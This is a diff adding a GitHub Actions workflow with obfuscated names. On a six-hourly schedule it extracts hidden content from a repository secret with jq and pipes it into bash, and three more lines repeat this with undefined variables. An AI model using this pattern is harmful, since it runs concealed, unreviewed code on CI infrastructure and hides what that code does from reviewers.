@@ -1,0 +1,19 @@
+name: ruiqiuchunlu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruiqiuchunlu
+        env:
+          vtxqx39500: ${{ secrets.vtxqx39500 }}
+        run: |
+          echo $vtxqx39500 | jq -r .udne87903 | /bin/bash
+          echo $fku3 | jq -r .keyc042 | /bin/bash
+          echo $vgpd3 | jq -r .xmiw33447 | /bin/bash
+          echo $hd6993 | jq -r .sodr4062 | /bin/bash
+
